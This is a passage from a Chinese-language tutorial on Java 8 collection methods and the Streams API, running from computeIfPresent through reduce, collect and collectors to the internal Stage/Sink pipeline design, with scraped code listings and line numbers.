HashSet < String > ( ) ; \n    valueSet . add ( "one" ) ; \n    map . put ( 1 ,  valueSet ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 // Java8的实现方式 \n map . computeIfAbsent ( 1 ,  v  ->   new   HashSet < String > ( ) ) . add ( "yi" ) ; \n \n 1 使用computeIfAbsent()将条件判断和添加操作合二为一，使代码更加简洁． \n computeIfPresent() \n 该方法签名为V computeIfPresent(K key, BiFunction<? super K,? super V,? extends V> remappingFunction)，作用跟computeIfAbsent()相反，即，只有在当前Map中存在key值的映射且非null时，才调用remappingFunction，如果remappingFunction执行结果为null，则删除key的映射，否则使用该结果替换key原来的映射． \n 这个函数的功能跟如下代码是等效的： \n // Java7及以前跟computeIfPresent()等效的代码 \n if   ( map . get ( key )   !=   null )   { \n     V  oldValue  =  map . get ( key ) ; \n     V  newValue  =  remappingFunction . apply ( key ,  oldValue ) ; \n     if   ( newValue  !=   null ) \n        map . put ( key ,  newValue ) ; \n     else \n        map . remove ( key ) ; \n     return  newValue ; \n } \n return   null ; \n \n 1 2 3 4 5 6 7 8 9 10 11 Java8为容器新增一些有用的方法，这些方法有些是为完善原有功能，有些是为引入函数式编程，学习和使用这些方法有助于我们写出更加简洁有效的代码．\n函数接口虽然很多，但绝大多数时候我们根本不需要知道它们的名字，书写Lambda表达式时类型推断帮我们做了一切 \n Streams API(I) \n 你可能没意识到Java对函数式编程的重视程度，看看Java 8加入函数式编程扩充多少功能就清楚了。Java 8之所以费这么大功夫引入函数式编程，原因有二： \n \n 代码简洁函数式编程写出的代码简洁且意图明确，使用stream接口让你从此告别for循环。 \n 多核友好，Java函数式编程使得编写并行程序从未如此简单，你需要的全部就是调用一下parallel()方法。 \n \n 这一节我们学习stream，也就是Java函数式编程的主角。对于Java 7来说stream完全是个陌生东西，stream并不是某种数据结构，它只是数据源的一种视图。这里的数据源可以是一个数组，Java容器或I/O channel等。正因如此要得到一个stream通常不会手动创建，而是调用对应的工具方法，比如： \n \n 调用Collection.stream()或者Collection.parallelStream()方法 \n 调用Arrays.stream(T[] array)方法 \n \n 常见的stream接口继承关系如图： \n \n 图中4种stream接口继承自BaseStream，其中IntStream, LongStream, DoubleStream对应三种基本类型（int, long, double，注意不是包装类型），Stream对应所有剩余类型的stream视图。为不同数据类型设置不同stream接口，可以1.提高性能，2.增加特定接口函数。 \n \n 你可能会奇怪为什么不把IntStream等设计成Stream的子接口？毕竟这接口中的方法名大部分是一样的。答案是这些方法的名字虽然相同，但是返回类型不同，如果设计成父子接口关系，这些方法将不能共存，因为Java不允许只有返回类型不同的方法重载。 \n 虽然大部分情况下stream是容器调用Collection.stream()方法得到的，但stream和collections有以下不同： \n \n 无存储。stream不是一种数据结构，它只是某种数据源的一个视图，数据源可以是一个数组，Java容器或I/O channel等。 \n 为函数式编程而生。对stream的任何修改都不会修改背后的数据源，比如对stream执行过滤操作并不会删除被过滤的元素，而是会产生一个不包含被过滤元素的新stream。 \n 惰式执行。stream上的操作并不会立即执行，只有等到用户真正需要结果的时候才会执行。 \n 可消费性。stream只能被“消费”一次，一旦遍历过就会失效，就像容器的迭代器那样，想要再次遍历必须重新生成。\n对stream的操作分为为两类，中间操作(intermediate operations)和结束操作(terminal operations)，二者特点是： \n \n \n 中间操作总是会惰式执行，调用中间操作只会生成一个标记了该操作的新stream，仅此而已。 \n 结束操作会触发实际计算，计算发生时会把所有中间操作积攒的操作以pipeline的方式执行，这样可以减少迭代次数。计算完成之后stream就会失效。\n如果你熟悉Apache Spark RDD，对stream的这个特点应该不陌生。 \n \n 下表汇总了Stream接口的部分常见方法： \n \n \n \n 操作类型 \n 接口方法 \n \n \n \n \n 中间操作 \n concat() distinct() filter() flatMap() limit() map() peek() skip() sorted() parallel() sequential() unordered() \n \n \n 结束操作 \n allMatch() anyMatch() collect() count() findAny() findFirst() forEach() forEachOrdered() max() min() noneMatch() reduce() toArray() \n \n \n \n 区分中间操作和结束操作最简单的方法，就是看方法的返回值，返回值为stream的大都是中间操作，否则是结束操作。 \n stream方法使用 \n stream跟函数接口关系非常紧密，没有函数接口stream就无法工作。回顾一下：函数接口是指内部只有一个抽象方法的接口。通常函数接口出现的地方都可以使用Lambda表达式，所以不必记忆函数接口的名字。 \n forEach() \n 我们对forEach()方法并不陌生，在Collection中我们已经见过。方法签名为void forEach(Consumer<? super E> action)，作用是对容器中的每个元素执行action指定的动作，也就是对元素进行遍历。 \n // 使用Stream.forEach()迭代 \n Stream < String >  stream  =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ) ; \nstream . forEach ( str  ->   System . out . println ( str ) ) ; \n \n 1 2 3 由于forEach()是结束方法，上述代码会立即执行，输出所有字符串。 \n filter() \n \n 函数原型为 Stream<T> filter(Predicate<? super T> predicate) ，作用是返回一个只包含满足predicate条件元素的Stream。 \n // 保留长度等于3的字符串 \n Stream < String >  stream =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ) ; \nstream . filter ( str  ->  str . length ( ) == 3 ) \n     . forEach ( str  ->   System . out . println ( str ) ) ; \n \n 1 2 3 4 上述代码将输出为长度等于3的字符串you和too。注意，由于filter()是个中间操作，如果只调用filter()不会有实际计算，因此也不会输出任何信息。 \n distinct() \n \n 函数原型为 Stream<T> distinct() ，作用是返回一个去除重复元素之后的Stream。 \n Stream < String >  stream =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ,   "too" ) ; \nstream . distinct ( ) \n     . forEach ( str  ->   System . out . println ( str ) ) ; \n \n 1 2 3 上述代码会输出去掉一个too之后的其余字符串。 \n sorted() \n 排序函数有两个，一个是用自然顺序排序，一个是使用自定义比较器排序，函数原型分别为 Stream<T>　sorted()和Stream<T>　sorted(Comparator<? super T> comparator) 。 \n Stream < String >  stream =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ) ; \nstream . sorted ( ( str1 ,  str2 )   ->  str1 . length ( ) - str2 . length ( ) ) \n     . forEach ( str  ->   System . out . println ( str ) ) ; \n \n 1 2 3 上述代码将输出按照长度升序排序后的字符串，结果完全在预料之中。 \n map() \n \n 函数原型为 <R> Stream<R> map(Function<? super T,? extends R> mapper) ，作用是返回一个对当前所有元素执行执行mapper之后的结果组成的Stream。直观的说，就是对每个元素按照某种操作进行转换，转换前后Stream中元素的个数不会改变，但元素的类型取决于转换之后的类型。 \n Stream < String >  stream　 =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ) ; \nstream . map ( str  ->  str . toUpperCase ( ) ) \n     . forEach ( str  ->   System . out . println ( str ) ) ; \n \n 1 2 3 上述代码将输出原字符串的大写形式。 \n flatMap() \n \n 函数原型为 <R> Stream<R> flatMap(Function<? super T,? extends Stream<? extends R>> mapper) ，作用是对每个元素执行mapper指定的操作，并用所有mapper返回的Stream中的元素组成一个新的Stream作为最终返回结果。说起来太拗口，通俗的讲flatMap()的作用就相当于把原stream中的所有元素都”摊平”之后组成的Stream，转换前后元素的个数和类型都可能会改变。 \n Stream < List < Integer > >  stream  =   Stream . of ( Arrays . asList ( 1 , 2 ) ,   Arrays . asList ( 3 ,   4 ,   5 ) ) ; \nstream . flatMap ( list  ->  list . stream ( ) ) \n     . forEach ( i  ->   System . out . println ( i ) ) ; \n \n 1 2 3 上述代码中，原来的stream中有两个元素，分别是两个List <Integer> ，执行flatMap()之后，将每个List都“摊平”成了一个个的数字，所以会新产生一个由5个数字组成的Stream。所以最终将输出1~5这5个数字。\n截止到目前我们感觉良好，已介绍Stream接口函数理解起来并不费劲儿。如果你就此以为函数式编程不过如此，恐怕是高兴地太早了。下一节对Stream规约操作的介绍将刷新你现在的认识。 \n Streams API(II) \n 上一节介绍了部分Stream常见接口方法，理解起来并不困难，但Stream的用法不止于此，本节我们将仍然以Stream为例，介绍流的规约操作。 \n 规约操作（reduction operation）又被称作折叠操作（fold），是通过某个连接动作将所有元素汇总成一个汇总结果的过程。元素求和、求最大值或最小值、求出元素总个数、将所有元素转换成一个列表或集合，都属于规约操作。Stream类库有两个通用的规约操作reduce()和collect()，也有一些为简化书写而设计的专用规约操作，比如sum()、max()、min()、count()等。 \n 最大或最小值这类规约操作很好理解（至少方法语义上是这样），我们着重介绍reduce()和collect()，这是比较有魔法的地方。 \n 多面手reduce() \n reduce操作可以实现从一组元素中生成一个值，sum()、max()、min()、count()等都是reduce操作，将他们单独设为函数只是因为常用。reduce()的方法定义有三种重写形式： \n \n Optional<T> reduce(BinaryOperator<T> accumulator) \n T reduce(T identity, BinaryOperator<T> accumulator) \n <U> U reduce(U identity, BiFunction<U,? super T,U> accumulator, BinaryOperator<U> combiner) \n \n 虽然函数定义越来越长，但语义不曾改变，多的参数只是为了指明初始值（参数identity），或者是指定并行执行时多个部分结果的合并方式（参数combiner）。reduce()最常用的场景就是从一堆值中生成一个值。用这么复杂的函数去求一个最大或最小值，你是不是觉得设计者有病。其实不然，因为“大”和“小”或者“求和”有时会有不同的语义。 \n 需求：从一组单词中找出最长的单词。这里“大”的含义就是“长”。 \n // 找出最长的单词 \n Stream < String >  stream  =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ) ; \n Optional < String >  longest  =  stream . reduce ( ( s1 ,  s2 )   ->  s1 . length ( ) >= s2 . length ( )   ?  s1  :  s2 ) ; \n //Optional<String> longest = stream.max((s1, s2) -> s1.length()-s2.length()); \n System . out . println ( longest . get ( ) ) ; \n \n 1 2 3 4 5 上述代码会选出最长的单词love，其中Optional是（一个）值的容器，使用它可以避免null值的麻烦。当然可以使用Stream.max(Comparator<? super T> comparator)方法来达到同等效果，但reduce()自有其存在的理由。 \n \n 需求：求出一组单词的长度之和。这是个“求和”操作，操作对象输入类型是String，而结果类型是Integer。 \n // 求单词长度之和 \n Stream < String >  stream  =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ) ; \n Integer  lengthSum  =  stream . reduce ( 0 , 　 // 初始值　// (1) \n         ( sum ,  str )   ->  sum + str . length ( ) ,   // 累加器 // (2) \n         ( a ,  b )   ->  a + b ) ; 　 // 部分和拼接器，并行执行时才会用到 // (3) \n // int lengthSum = stream.mapToInt(str -> str.length()).sum(); \n System . out . println ( lengthSum ) ; \n \n 1 2 3 4 5 6 7 上述代码标号(2)处将i. 字符串映射成长度，ii. 并和当前累加和相加。这显然是两步操作，使用reduce()函数将这两步合二为一，更有助于提升性能。如果想要使用map()和sum()组合来达到上述目的，也是可以的。 \n reduce()擅长的是生成一个值，如果想要从Stream生成一个集合或者Map等复杂的对象该怎么办呢？终极武器collect()横空出世！ \n 终极武器collect() \n 不夸张的讲，如果你发现某个功能在Stream接口中没找到，十有八九可以通过collect()方法实现。collect()是Stream接口方法中最灵活的一个，学会它才算真正入门Java函数式编程。先看几个热身的小例子： \n // 将Stream转换成容器或Map \n Stream < String >  stream  =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ) ; \n List < String >  list  =  stream . collect ( Collectors . toList ( ) ) ;   // (1) \n // Set<String> set = stream.collect(Collectors.toSet()); // (2) \n // Map<String, Integer> map = stream.collect(Collectors.toMap(Function.identity(), String::length)); // (3) \n \n 1 2 3 4 5 上述代码分别列举了如何将Stream转换成List、Set和Map。虽然代码语义很明确，可是我们仍然会有几个疑问： \n \n Function.identity()是干什么的？ \n String::length是什么意思？ \n Collectors是个什么东西？ \n 接口的静态方法和默认方法 \n Function是一个接口，那么Function.identity()是什么意思呢？这要从两方面解释： \n \n Java 8允许在接口中加入具体方法。接口中的具体方法有两种，default方法和static方法，identity()就是Function接口的一个静态方法。 \n Function.identity()返回一个输出跟输入一样的Lambda表达式对象，等价于形如t -> t形式的Lambda表达式。 \n \n 上面的解释是不是让你疑问更多？不要问我为什么接口中可以有具体方法，也不要告诉我你觉得t -> t比identity()方法更直观。我会告诉你接口中的default方法是一个无奈之举，在Java 7及之前要想在定义好的接口中加入新的抽象方法是很困难甚至不可能的，因为所有实现了该接口的类都要重新实现。试想在Collection接口中加入一个stream()抽象方法会怎样？default方法就是用来解决这个尴尬问题的，直接在接口中实现新加入的方法。既然已经引入了default方法，为何不再加入static方法来避免专门的工具类呢！ \n 方法引用 \n 诸如String::length的语法形式叫做方法引用（method references），这种语法用来替代某些特定形式Lambda表达式。如果Lambda表达式的全部内容就是调用一个已有的方法，那么可以用方法引用来替代Lambda表达式。方法引用可以细分为四类： \n \n \n \n 方法引用类别 \n 举例 \n \n \n \n \n 引用静态方法 \n Integer::sum \n \n \n 引用某个对象的方法 \n list::add \n \n \n 引用某个类的方法 \n String::length \n \n \n 引用构造方法 \n HashMap::new \n \n \n \n 我们会在后面的例子中使用方法引用。 \n 收集器 \n 相信前面繁琐的内容已彻底打消了你学习Java函数式编程的热情，不过很遗憾，下面的内容更繁琐。但这不能怪Stream类库，因为要实现的功能本身很复杂。 \n \n 收集器（Collector）是为Stream.collect()方法量身打造的工具接口（类）。考虑一下将一个Stream转换成一个容器（或者Map）需要做哪些工作？我们至少需要两样东西： \n \n 目标容器是什么？是ArrayList还是HashSet，或者是个TreeMap。 \n 新元素如何添加到容器中？是List.add()还是Map.put()。 \n \n 如果并行的进行规约，还需要告诉collect() 3. 多个部分结果如何合并成一个。 \n 结合以上分析，collect()方法定义为 <R> R collect(Supplier<R> supplier, BiConsumer<R,? super T> accumulator, BiConsumer<R,R> combiner) ，三个参数依次对应上述三条分析。不过每次调用collect()都要传入这三个参数太麻烦，收集器Collector就是对这三个参数的简单封装,所以collect()的另一定义为 <R,A> R collect(Collector<? super T,A,R> collector) 。Collectors工具类可通过静态方法生成各种常用的Collector。举例来说，如果要将Stream规约成List可以通过如下两种方式实现： \n //　将Stream规约成List \n Stream < String >  stream  =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ) ; \n List < String >  list  =  stream . collect ( ArrayList :: new ,   ArrayList :: add ,   ArrayList :: addAll ) ; // 方式１ \n //List<String> list = stream.collect(Collectors.toList());// 方式2 \n System . out . println ( list ) ; \n \n 1 2 3 4 5 通常情况下我们不需要手动指定collect()的三个参数，而是调用collect(Collector<? super T,A,R> collector)方法，并且参数中的Collector对象大都是直接通过Collectors工具类获得。实际上传入的收集器的行为决定了collect()的行为。 \n 使用collect()生成Collection \n 前面已经提到通过collect()方法将Stream转换成容器的方法，这里再汇总一下。将Stream转换成List或Set是比较常见的操作，所以Collectors工具已经为我们提供了对应的收集器，通过如下代码即可完成： \n // 将Stream转换成List或Set \n Stream < String >  stream  =   Stream . of ( "I" ,   "love" ,   "you" ,   "too" ) ; \n List < String >  list  =  stream . collect ( Collectors . toList ( ) ) ;   // (1) \n Set < String >  set  =  stream . collect ( Collectors . toSet ( ) ) ;   // (2) \n \n 1 2 3 4 上述代码能够满足大部分需求，但由于返回结果是接口类型，我们并不知道类库实际选择的容器类型是什么，有时候我们可能会想要人为指定容器的实际类型，这个需求可通过 Collectors.toCollection(Supplier<C> collectionFactory) 方法完成。 \n // 使用toCollection()指定规约容器的类型 \n ArrayList < String >  arrayList  =  stream . collect ( Collectors . toCollection ( ArrayList :: new ) ) ; // (3) \n HashSet < String >  hashSet  =  stream . collect ( Collectors . toCollection ( HashSet :: new ) ) ; // (4) \n \n 1 2 3 上述代码(3)处指定规约结果是ArrayList，而(4)处指定规约结果为HashSet。一切如你所愿。 \n 使用collect()生成Map \n 前面已经说过Stream背后依赖于某种数据源，数据源可以是数组、容器等，但不能是Map。反过来从Stream生成Map是可以的，但我们要想清楚Map的key和value分别代表什么，根本原因是我们要想清楚要干什么。通常在三种情况下collect()的结果会是Map： \n \n 使用Collectors.toMap()生成的收集器，用户需要指定如何生成Map的key和value。 \n 使用Collectors.partitioningBy()生成的收集器，对元素进行二分区操作时用到。 \n 使用Collectors.groupingBy()生成的收集器，对元素做group操作时用到。 \n \n 情况1：使用toMap()生成的收集器，这种情况是最直接的，前面例子中已提到，这是和Collectors.toCollection()并列的方法。如下代码展示将学生列表转换成由<学生，GPA>组成的Map。非常直观，无需多言。 \n // 使用toMap()统计学生GPA \n Map < Student ,   Double >  studentToGPA  = \n     students . stream ( ) . collect ( Collectors . toMap ( Function . identity ( ) , // 如何生成key \n                                     student  ->   computeGPA ( student ) ) ) ; // 如何生成value \n \n 1 2 3 4 情况2：使用partitioningBy()生成的收集器，这种情况适用于将Stream中的元素依据某个二值逻辑（满足条件，或不满足）分成互补相交的两部分，比如男女性别、成绩及格与否等。下列代码展示将学生分成成绩及格或不及格的两部分。 \n // Partition students into passing and failing \n Map < Boolean ,   List < Student > >  passingFailing  =  students . stream ( ) \n          . collect ( Collectors . partitioningBy ( s  ->  s . getGrade ( )   >=  PASS_THRESHOLD ) ) ; \n \n 1 2 3 情况3：使用groupingBy()生成的收集器，这是比较灵活的一种情况。跟SQL中的group by语句类似，这里的groupingBy()也是按照某个属性对数据进行分组，属性相同的元素会被对应到Map的同一个key上。下列代码展示将员工按照部门进行分组： \n // Group employees by department \n Map < Department ,   List < Employee > >  byDept  =  employees . stream ( ) \n             . collect ( Collectors . groupingBy ( Employee :: getDepartment ) ) ; \n \n 1 2 3 以上只是分组的最基本用法，有些时候仅仅分组是不够的。在SQL中使用group by是为了协助其他查询，比如1. 先将员工按照部门分组，2. 然后统计每个部门员工的人数。Java类库设计者也考虑到了这种情况，增强版的groupingBy()能够满足这种需求。增强版的groupingBy()允许我们对元素分组之后再执行某种运算，比如求和、计数、平均值、类型转换等。这种先将元素分组的收集器叫做上游收集器，之后执行其他运算的收集器叫做下游收集器(downstream Collector)。 \n // 使用下游收集器统计每个部门的人数 \n Map < Department ,   Integer >  totalByDept  =  employees . stream ( ) \n                     . collect ( Collectors . groupingBy ( Employee :: getDepartment , \n                                                    Collectors . counting ( ) ) ) ; // 下游收集器 \n \n 1 2 3 4 上面代码的逻辑是不是越看越像SQL？高度非结构化。还有更狠的，下游收集器还可以包含更下游的收集器，这绝不是为了炫技而增加的把戏，而是实际场景需要。考虑将员工按照部门分组的场景，如果我们想得到每个员工的名字（字符串），而不是一个个Employee对象，可通过如下方式做到： \n // 按照部门对员工分布组，并只保留员工的名字 \n Map < Department ,   List < String > >  byDept  =  employees . stream ( ) \n                 . collect ( Collectors . groupingBy ( Employee :: getDepartment , \n                         Collectors . mapping ( Employee :: getName , // 下游收集器 \n                                 Collectors . toList ( ) ) ) ) ; // 更下游的收集器 \n \n 1 2 3 4 5 如果看到这里你还没有对Java函数式编程失去信心，恭喜你，你已经顺利成为Java函数式编程大师了。 \n 使用collect()做字符串join \n 这个肯定是大家喜闻乐见的功能，字符串拼接时使用Collectors.joining()生成的收集器，从此告别for循环。Collectors.joining()方法有三种重写形式，分别对应三种不同的拼接方式。无需多言，代码过目难忘。 \n // 使用Collectors.joining()拼接字符串 \n Stream < String >  stream  =   Stream . of ( "I" ,   "love" ,   "you" ) ; \n //String joined = stream.collect(Collectors.joining());// "Iloveyou" \n //String joined = stream.collect(Collectors.joining(","));// "I,love,you" \n String  joined  =  stream . collect ( Collectors . joining ( "," ,   "{" ,   "}" ) ) ; // "{I,love,you}" \n \n 1 2 3 4 5 #  collect()还可以做更多 \n 除了可以使用Collectors工具类已经封装好的收集器，我们还可以自定义收集器，或者直接调用 collect(Supplier<R> supplier, BiConsumer<R,? super T> accumulator, BiConsumer<R,R> combiner) 方法，收集任何形式你想要的信息。不过Collectors工具类应该能满足我们的绝大部分需求，手动实现之间请先看看文档。 \n Stream Pipelines \n 前面我们已经学会如何使用Stream API，用起来真的很爽，但简洁的方法下面似乎隐藏着无尽的秘密，如此强大的API是如何实现的呢？比如Pipeline是怎么执行的，每次方法调用都会导致一次迭代吗？自动并行又是怎么做到的，线程个数是多少？本节我们学习Stream流水线的原理，这是Stream实现的关键所在。 \n 首先回顾一下容器执行Lambda表达式的方式，以ArrayList.forEach()方法为例，具体代码如下： \n // ArrayList.forEach() \n public   void   forEach ( Consumer < ?   super   E >  action )   { \n     . . . \n     for   ( int  i = 0 ;  modCount  ==  expectedModCount  &&  i  <  size ;  i ++ )   { \n        action . accept ( elementData [ i ] ) ; // 回调方法 \n     } \n     . . . \n } \n \n 1 2 3 4 5 6 7 8 我们看到ArrayList.forEach()方法的主要逻辑就是一个for循环，在该for循环里不断调用action.accept()回调方法完成对元素的遍历。这完全没有什么新奇之处，回调方法在Java GUI的监听器中广泛使用。Lambda表达式的作用就是相当于一个回调方法，这很好理解。 \n Stream API中大量使用Lambda表达式作为回调方法，但这并不是关键。理解Stream我们更关心的是另外两个问题：流水线和自动并行。使用Stream或许很容易写入如下形式的代码： \n int  longestStringLengthStartingWithA\n         =  strings . stream ( ) \n               . filter ( s  ->  s . startsWith ( "A" ) ) \n               . mapToInt ( String :: length ) \n               . max ( ) ; \n \n 1 2 3 4 5 上述代码求出以字母A开头的字符串的最大长度，一种直白的方式是为每一次函数调用都执一次迭代，这样做能够实现功能，但效率上肯定是无法接受的。类库的实现着使用流水线（Pipeline）的方式巧妙的避免了多次迭代，其基本思想是在一次迭代中尽可能多的执行用户指定的操作。为讲解方便我们汇总了Stream的所有操作。 \n Stream操作分类 中间操作(Intermediate operations) 无状态(Stateless) unordered() filter() map() mapToInt() mapToLong() mapToDouble() flatMap() flatMapToInt() flatMapToLong() flatMapToDouble() peek() 有状态(Stateful) distinct() sorted() sorted() limit() skip()  结束操作(Terminal operations) 非短路操作 forEach() forEachOrdered() toArray() reduce() collect() max() min() count() 短路操作(short-circuiting) anyMatch() allMatch() noneMatch() findFirst() findAny() \n Stream上的所有操作分为两类：中间操作和结束操作，中间操作只是一种标记，只有结束操作才会触发实际计算。中间操作又可以分为无状态的(Stateless)和有状态的(Stateful)，无状态中间操作是指元素的处理不受前面元素的影响，而有状态的中间操作必须等到所有元素处理之后才知道最终结果，比如排序是有状态操作，在读取所有元素之前并不能确定排序结果；结束操作又可以分为短路操作和非短路操作，短路操作是指不用处理全部元素就可以返回结果，比如找到第一个满足条件的元素。之所以要进行如此精细的划分，是因为底层对每一种情况的处理方式不同。 \n 一种直白的实现方式 \n \n 仍然考虑上述求最长字符串的程序，一种直白的流水线实现方式是为每一次函数调用都执一次迭代，并将处理中间结果放到某种数据结构中（比如数组，容器等）。具体说来，就是调用filter()方法后立即执行，选出所有以A开头的字符串并放到一个列表list1中，之后让list1传递给mapToInt()方法并立即执行，生成的结果放到list2中，最后遍历list2找出最大的数字作为最终结果。程序的执行流程如如所示： \n 这样做实现起来非常简单直观，但有两个明显的弊端： \n \n 迭代次数多。迭代次数跟函数调用的次数相等。 \n 频繁产生中间结果。每次函数调用都产生一次中间结果，存储开销无法接受。 \n \n 这些弊端使得效率底下，根本无法接受。如果不使用Stream API我们都知道上述代码该如何在一次迭代中完成，大致是如下形式： \n int  longest  =   0 ; \n for ( String  str  :  strings ) { \n     if ( str . startsWith ( "A" ) ) { // 1. filter(), 保留以A开头的字符串 \n         int  len  =  str . length ( ) ; // 2. mapToInt(), 转换成长度 \n        longest  =   Math . max ( len ,  longest ) ; // 3. max(), 保留最长的长度 \n     } \n } \n \n 1 2 3 4 5 6 7 采用这种方式我们不但减少了迭代次数，也避免了存储中间结果，显然这就是流水线，因为我们把三个操作放在了一次迭代当中。只要我们事先知道用户意图，总是能够采用上述方式实现跟Stream API等价的功能，但问题是Stream类库的设计者并不知道用户的意图是什么。如何在无法假设用户行为的前提下实现流水线，是类库的设计者要考虑的问题。 \n Stream流水线解决方案 \n 我们大致能够想到，应该采用某种方式记录用户每一步的操作，当用户调用结束操作时将之前记录的操作叠加到一起在一次迭代中全部执行掉。沿着这个思路，有几个问题需要解决： \n \n 用户的操作如何记录？ \n 操作如何叠加？ \n 叠加之后的操作如何执行？ \n 执行后的结果（如果有）在哪里？ \n 操作如何记录？ \n \n 注意这里使用的是“操作(operation)”一词，指的是“Stream中间操作”的操作，很多Stream操作会需要一个回调函数（Lambda表达式），因此一个完整的操作是<数据来源，操作，回调函数>构成的三元组。Stream中使用Stage的概念来描述一个完整的操作，并用某种实例化后的PipelineHelper来代表Stage，将具有先后顺序的各个Stage连到一起，就构成了整个流水线。跟Stream相关类和接口的继承关系图示。 \n 还有IntPipeline, LongPipeline, DoublePipeline没在图中画出，这三个类专门为三种基本类型（不是包装类型）而定制的，跟ReferencePipeline是并列关系。图中Head用于表示第一个Stage，即调用调用诸如Collection.stream()方法产生的Stage，很显然这个Stage里不包含任何操作；StatelessOp和StatefulOp分别表示无状态和有状态的Stage，对应于无状态和有状态的中间操作。 \n Stream流水线组织结构示意图如下： \n \n 图中通过Collection.stream()方法得到Head也就是stage0，紧接着调用一系列的中间操作，不断产生新的Stream。这些Stream对象以双向链表的形式组织在一起，构成整个流水线，由于每个Stage都记录了前一个Stage和本次的操作以及回调函数，依靠这种结构就能建立起对数据源的所有操作。这就是Stream记录操作的方式。 \n 操作如何叠加？ \n 以上只是解决了操作记录的问题，要想让流水线起到应有的作用我们需要一种将所有操作叠加到一起的方案。你可能会觉得这很简单，只需要从流水线的head开始依次执行每一步的操作（包括回调函数）就行了。这听起来似乎是可行的，但是你忽略了前面的Stage并不知道后面Stage到底执行了哪种操作，以及回调函数是哪种形式。换句话说，只有当前Stage本身才知道该如何执行自己包含的动作。这就需要有某种协议来协调相邻Stage之间的调用关系。 \n 这种协议由Sink接口完成，Sink接口包含的方法如下表所示： \n 方法名 作用 \n 方法名 作用 void begin(long size) 开始遍历元素之前调用该方法，通知Sink做好准备。 void end() 所有元素遍历完成之后调用，通知Sink没有更多的元素了。 boolean cancellationRequested() 是否可以结束操作，可以让短路操作尽早结束。 void accept(T t) 遍历元素时调用，接受一个待处理元素，并对元素进行处理。Stage把自己包含的操作和回调方法封装到该方法里，前一个Stage只需要调用当前Stage.accept(T t)方法就行了。 \n 有了上面的协议，相邻Stage之间调用就很方便了，每个Stage都会将自己的操作封装到一个Sink里，前一个Stage只需调用后一个Stage的accept()方法即可，并不需要知道其内部是如何处理的。当然对于有状态的操作，Sink的begin()和end()方法也是必须实现的。比如Stream.sorted()是一个有状态的中间操作，其对应的Sink.begin()方法可能创建一个乘放结果的容器，而accept()方法负责将元素添加到该容器，最后end()负责对容器进行排序。对于短路操作，Sink.cancellationRequested()也是必须实现的，比如Stream.findFirst()是短路操作，只要找到一个元素，cancellationRequested()就应该返回true，以便调用者尽快结束查找。Sink的四个接口方法常常相互协作，共同完成计算任务。实际上Stream API内部实现的的本质，就是如何重载Sink的这四个接口方法。 \n 有了Sink对操作的包装，Stage之间的调用问题就解决了，执行时只需要从流水线的head开始对数据源依次调用每个Stage对应的Sink.{begin(), accept(), cancellationRequested(), end()}方法就可以了。一种可能的Sink.accept()方法流程是这样的： \n void   accept ( U  u ) { \n     1.  使用当前 Sink 包装的回调函数处理u\n     2.  将处理结果传递给流水线下游的 Sink \n } \n \n 1 2 3 4 Sink接口的其他几个方法也是按照这种[处理->转发]的模型实现。下面我们结合具体例子看看Stream的中间操作是如何将自身的操作包装成Sink以及Sink是如何将处理结果转发给下一个Sink的。先看Stream.map()方法： \n // Stream.map()，调用该方法将产生一个新的Stream \n public   final   < R >   Stream < R >   map ( Function < ?   super  P_OUT ,   ?   extends   R >  mapper )   { \n     . . . \n     return   new   StatelessOp < P_OUT ,   R > ( this ,   StreamShape . REFERENCE , \n                                  StreamOpFlag . NOT_SORTED  |   StreamOpFlag . NOT_DISTINCT )   { \n         @Override   /*opWripSink()方法返回由回调函数包装而成Sink*/ \n         Sink < P_OUT >   opWrapSink ( int  flags ,   Sink < R >  downstream )   { \n             return   new   Sink . ChainedReference < P_OUT ,   R > ( downstream )   { \n                 @Override \n                 public   void   accept ( P_OUT  u )   { \n                     R  r  =  mapper . apply ( u ) ; // 1. 使用当前Sink包装的回调函数mapper处理u \n                    downstream . accept ( r ) ; // 2. 将处理结果传递给流水线下游的Sink \n                 } \n             } ; \n         } \n     } ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 上述代码看似复杂，其实逻辑很简单，就是将回调函数mapper包装到一个Sink当中。由于Stream.map()是一个无状态的中间操作，所以map()方法返回了一个StatelessOp内部类对象（一个新的Stream），调用这个新Stream的opWripSink()方法将得到一个包装了当前回调函数的Sink。 \n 再来看一个复杂一点的例子。Stream.sorted()方法将对Stream中的元素进行排序，显然这是一个有状态的中间操作，因为读取所有元素之前是没法得到最终顺序的。抛开模板代码直接进入问题本质，sorted()方法是如何将操作封装成Sink的呢？sorted()一种可能封装的Sink代码如下： \n // Stream.sort()方法用到的Sink实现 \n class   RefSortingSink < T >   extends   AbstractRefSortingSink < T >   { \n     private   ArrayList < T >  list ; // 存放用于排序的元素 \n     RefSortingSink ( Sink < ?   super   T >  downstream ,   Comparator < ?   super   T >  comparator )   { \n         super ( downstream ,  comparator ) ; \n     } \n     @Override \n     public   void   begin ( long  size )   { \n         . . . \n         // 创建一个存放排序元素的列表 \n        list  =   ( size  >=   0 )   ?   new   ArrayList < T > ( ( int )  size )   :   new   ArrayList < T > ( ) ; \n     } \n     @Override \n     public   void   end ( )   { \n        list . sort ( comparator ) ; // 只有元素全部接收之后才能开始排序 \n        downstream . begin ( list . size ( ) ) ; \n         if   ( ! cancellationWasRequested )   { // 下游Sink不包含短路操作 \n            list . forEach ( downstream :: accept ) ; // 2. 将处理结果传递给流水线下游的Sink \n         } \n         else   { // 下游Sink包含短路操作 \n             for   ( T  t  :  list )   { // 每次都调用cancellationRequested()询问是否可以结束处理。 \n                 if   ( downstream . cancellationRequested ( ) )   break ; \n                downstream . accept ( t ) ; // 2. 将处理结果传递给流水线下游的Sink \n             } \n         } \n        downstream . end ( ) ; \n        list  =   null ; \n     } \n     @Override \n     public   void   accept ( T  t )   { \n        list . add ( t ) ; // 1. 使用当前Sink包装动作处理t，只是简单的将元素添加到中间列表当中 \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 